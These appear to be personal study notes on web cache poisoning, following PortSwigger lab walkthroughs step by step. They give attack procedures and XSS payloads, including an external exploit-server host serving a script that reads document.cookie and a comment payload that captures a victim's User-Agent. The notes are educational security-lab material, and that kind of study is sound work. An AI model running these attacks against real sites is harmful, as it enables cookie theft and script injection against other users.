# WebCache Poisoning

How to find vuln? 

Search for this: "*Cache-Control: max*"

Guess GET parameter, Guess Headers, "Bulk scan" > "Rails parameter cloacking scan"

Common header: X-Forwared-Host, X-Forwarded-Scheme, Origin: (For cache buster), 

## Description
Web cache poisoning is an advanced technique whereby an attacker exploits the behavior of a web server and cache so 
that a harmful HTTP response is served to other users.
Fundamentally, web cache poisoning involves two phases. First, the attacker must work out how to elicit a response from the back-end server 
that inadvertently contains some kind of dangerous payload. Once successful, they need to make sure that their response is cached and 
subsequently served to the intended victims.
A poisoned web cache can potentially be a devastating means of distributing numerous different attacks, exploiting vulnerabilities 
such as XSS, JavaScript injection, open redirection, and so on.
Use X-Forwarded-Host: header some times or `X-Forwarded-Scheme`, sometimes you can be able to redirect the traffic

### Web cache poisoning via ambiguous requests

Try to use double request, in order to inject scripts url
```
Host: 0ae0003c04175dd0c09d1a5000eb005d.web-security-academy.net
Host: testojdajddj.com

Result:
        <script type="text/javascript" src="//testojdajddj.com/resources/js/tracking.js">
        Go to the exploit server and create a file at /resources/js/tracking.js
```


### Web cache poisoning with an unkeyed header

Add the *X-Forwarded-Host* header with an arbitrary hostname, such as example.com, and send the request.
Observe that the `X-Forwarded-Host` header has been used to dynamically generate an absolute URL for importing a JavaScript file stored at /resources/js/tracking.js.
Replay the request and observe that the response contains the header X-Cache: hit. This tells us that the response came from the cache.
Go to the exploit server and change the file name to match the path used by the vulnerable response:

/resources/js/tracking.js
In the body, enter the payload alert(document.cookie) and store the exploit.
Open the GET request for the home page in Burp Repeater and remove the cache buster.
Add the following header, remembering to enter your own exploit server ID:

X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net

### Web cache poisoning with an unkeyed cookie

Notice that the first response you received sets the cookie fehost=prod-cache-01.
Reload the home page and observe that the value from the fehost cookie is reflected inside a double-quoted JavaScript object in the response.
Send this request to Burp Repeater and add a cache-buster query parameter.
Change the value of the cookie to an arbitrary string and resend the request. Confirm that this string is reflected in the response.
Place a suitable XSS payload in the fehost cookie, for example:

fehost=someString"-alert(1)-"someString

### Web cache poisoning with multiple headers

Cache on the request resources/js/tracking.js
Find the GET request for the JavaScript file /resources/js/tracking.js and send it to Burp Repeater.
Add a cache-buster query parameter and the X-Forwarded-Host header with an arbitrary hostname, such as example.com. Notice that this doesn't seem to have any effect on the response.
Remove the X-Forwarded-Host header and add the X-Forwarded-Scheme header instead. Notice that if you include any value other than HTTPS, you receive a 302 response. The Location header shows that you are being redirected to the same URL that you requested, but using https://.
Add the `X-Forwarded-Host`: example.com header back to the request, but keep `X-Forwarded-Scheme`: nothttps as well. Send this request and notice that the Location header of the 302 redirect now points to https://example.com/.
Go to the exploit server and change the file name to match the path used by the vulnerable response:

 /resources/js/tracking.js
In the body, enter the payload alert(document.cookie) and store the exploit.
Go back to the request in Burp Repeater and set the X-Forwarded-Host header as follows, remembering to enter your own exploit server ID:

X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
Make sure the X-Forwarded-Scheme header is set to anything other than HTTPS.
Send the request until you see your exploit server URL reflected in the response and X-Cache: hit in the headers.
To check that the response was cached correctly, right-click on the request in Burp, select "Copy URL", and load this URL in Burp's browser. If the cache was successfully poisoned, you will see the script containing your payload, alert(document.cookie). Note that the alert() won't actually execute here.
Go back to Burp Repeater, remove the cache buster, and resend the request until you poison the cache again.
To simulate the victim, reload the home page in the browser and make sure that the alert() fires.

### Targeted web cache poisoning using an unknown header
With the Param Miner extension enabled, right-click on the request and select "Guess headers". After a while, Param Miner will report that there is a secret input in the form of the X-Host header.
Send the GET request to Burp Repeater and add a cache-buster query parameter.
Add the X-Host header with an arbitrary hostname, such as example.com. Notice that the value of this header is used to dynamically generate an absolute URL for importing the JavaScript file stored at /resources/js/tracking.js.
Go to the exploit server and change the file name to match the path used by the vulnerable response:

/resources/js/tracking.js
In the body, enter the payload alert(document.cookie) and store the exploit.
Go back to the request in Burp Repeater and set the `X-Host` header as follows, remembering to add your own exploit server ID:

X-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
Send the request until you see your exploit server URL reflected in the response and X-Cache: hit in the headers.
To simulate the victim, load the URL in the browser and make sure that the alert() fires.
Notice that the *Vary header* is used to specify that the User-Agent is part of the cache key. To target the victim, you need to find out their User-Agent.
On the website, notice that the comment feature allows certain HTML tags. Post a comment containing a suitable payload to cause the victim's browser to interact with your exploit server, for example:

<img src="https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/foo" />
Go to the blog page and double-check that your comment was successfully posted.
Go to the exploit server and click the button to open the "Access log". Refresh the page every 
few seconds until you see requests made by a different user. This is the victim. Copy their User-Agent from the log.

### Web cache poisoning via an unkeyed query string

Origin cache buster
Notice that you can use the `Origin header as a cache buster`. Add it to your request.
When you get a cache miss, notice that your injected parameters are reflected in the response. If the response to your request is cached, you can remove the query parameters and they will still be reflected in the cached response.
Add an arbitrary parameter that breaks out of the reflected string and injects an XSS payload:

*GET /?evil='/><script>alert(1)</script> IN THE QUERY*
Keep replaying the request until you see your payload reflected in the response and X-Cache: hit in the headers.
To simulate the victim, remove the query string from your request and send it again (while using the same cache buster). Check that you still receive the cached response containing your payload.
Remove the cache-buster Origin header and add your payload back to the query string. Replay the request until you have poisoned the cache for normal users. Confirm this attack has been successful 
by loading the home page in the browser and observing the popup.

### Web cache poisoning via an unkeyed query parameter

Use Param Miner's "Guess GET parameters" feature to identify that the parameter utm_content is supported by the application.
Confirm that this parameter is unkeyed by adding it to the query string and checking that you still get a cache hit. Keep sending the request until you get a cache miss. Observe that this unkeyed parameter is also reflected in the response along with the rest of the query string.
Send a request with a utm_content parameter that breaks out of the reflected string and injects an XSS payload:

`GET /?utm_content='/><script>alert(1)</script>`
Once your payload is cached, remove the utm_content parameter, right-click on the request, and select "Copy URL". Open this URL in the browser and check that the alert() is triggered when you load the page.
Remove your cache buster, re-add the utm_content parameter with your payload, and

###  Parameter cloaking IN THE PARAMETER

Notice that if you use a semicolon (;) to append another parameter to utm_content, the cache treats this as a single parameter. This means that the extra parameter is also excluded from the cache key. Alternatively, with Param Miner loaded, right-click on the request and select "Bulk scan" > "Rails parameter cloaking scan" to identify the vulnerability automatically.
Observe that every page imports the script /js/geolocate.js, executing the callback function setCountryCookie(). Send the request GET /js/geolocate.js?callback=setCountryCookie to Burp Repeater.
Notice that you can control the name of the function that is called on the returned data by editing the callback parameter. However, you can't poison the cache for other users in this way because the parameter is keyed.
Study the cache behavior. Observe that if you add duplicate callback parameters, only the final one is reflected in the response, but both are still keyed. However, if you append the second callback parameter to the utm_content parameter using a semicolon, it is excluded from the cache key and still overwrites the callback function in the response:

`GET /js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=arbitraryFunction`

HTTP/1.1 200 OK
X-Cache-Key: /js/geolocate.js?callback=setCountryCookie
…
arbitraryFunction({"country" : "United Kingdom"})
Send the request again, but this time pass in alert(1) as the callback function:

GET /js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=alert(1)


### Web cache poisoning via a fat GET request

Observe that every page imports the script /js/geolocate.js, executing the callback function setCountryCookie(). Send the request GET /js/geolocate.js?callback=setCountryCookie to Burp Repeater.
Notice that you can control the name of the function that is called in the response by passing in a duplicate callback parameter via the request body. Also notice that the cache key is still derived from the original callback parameter in the request line:

GET /js/geolocate.js?callback=setCountryCookie
…
callback=arbitraryFunction

HTTP/1.1 200 OK
X-Cache-Key: /js/geolocate.js?callback=setCountryCookie
…
arbitraryFunction({"country" : "United Kingdom"})
Send the request again, but this time pass in alert(1) as the callback function. Check that you can successfully poison the cache.
Remove any cache busters and re-poison the cache. The lab will solve when the victim user visits any page containing this resource import URL.

### URL normalization

In Burp Repeater, browse to any non-existent path, such as GET /random. Notice that the path you requested is reflected in the error message.
Add a suitable reflected XSS payload to the request line:

`GET /random</p><script>alert(1)</script><p>foo`
Notice that if you request this URL in the browser, the payload doesn't execute because it is URL-encoded.
In Burp Repeater, poison the cache with your payload and then immediately load the URL in the browser. This time, the alert() is executed because the browser's encoded payload was URL-decoded by the cache, causing a cache hit with the earlier request.
Re-poison the cache then immediately go to the lab and click "Deliver link to victim". Submit your malicious URL. The lab will be solved when the victim visits the link.
  
  
